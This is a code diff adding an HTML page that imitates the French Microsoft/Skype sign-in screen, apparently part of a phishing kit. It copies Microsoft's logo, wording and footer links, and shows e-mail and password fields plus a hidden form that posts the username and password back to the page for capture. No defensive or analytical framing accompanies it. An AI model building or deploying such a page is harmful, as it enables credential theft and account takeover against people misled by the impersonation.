@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Connectez-vous à votre compte</title>
+	<link rel="icon" type="image/x-icon" href="./src/favicon.ico">
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+	<div id="filter" class="hidden"></div>
+	<img src="./src/loading.gif" id="load_bar" class="hidden">
+	<div id="box-center">
+		<div id="box-1">
+
+			<img src="./src/logo.svg" style="width: 108px; height: 24px;">
+			<div id="name_email" class="hidden"></div>
+			<div id="se-connecter">Se connecter</div>
+			<div id="error_email" class="hidden">Entrez une adresse e-mail, un numéro de téléphone ou identifiant Skype valide.
+			</div>
+			<input type="email" name="email" id="input_mail" spellcheck="false" autocomplete="off" placeholder="E-mail, téléphone ou identifiant Skype">
+			
+			<input type="password" class="hidden" name="password" id="input_password" spellcheck="false" autocomplete="off" placeholder="Mot de passe">
+
+			<div id="no_account">Pas de compte ? <a href="https://login.live.com/oauth20_authorize.srf">Créez-en-un !</a></div>
+			<div id="not_accesible"><a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize">Votre compte n'est pas accessible ?</a></div>
+			<div id="buttons">
+				<button id="return">Retour</button>
+				<button id="next">Suivant</button>
+			</div>
+		</div>
+		<div id="box-2">
+			<img src="./src/cle.svg" style="width: 32px; height: 32px;">
+			<div id="connexion_options">Options de connexion</div>
+		</div>
+	</div>
+	
+	<form action="" method="post" name="form" class="hidden">
+		<input name="username" id="username_form">
+		<input name="password" id="password_form">
+		<input id="login" name="login" type="submit" value="Log In" >
+	</form>
+
+	<footer>
+		<a class="footer-item" href="https://www.microsoft.com/fr-FR/servicesagreement/">Conditions d'utilisation</a>
+		<a class="footer-item" href="https://privacy.microsoft.com/fr-FR/privacystatement">Confidentialité et cookies</a>
+		<a class="footer-item" href="https://www.microsoft.com/fr-fr/accessibility/accessibilite/accessibility-statement">Accessibilité : partiellement conforme</a>
+		<a class="footer-item footer-last" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize">...</a>
+	</footer>
+	<script type="text/javascript" src="script.js"></script>
+</body>
+</html>
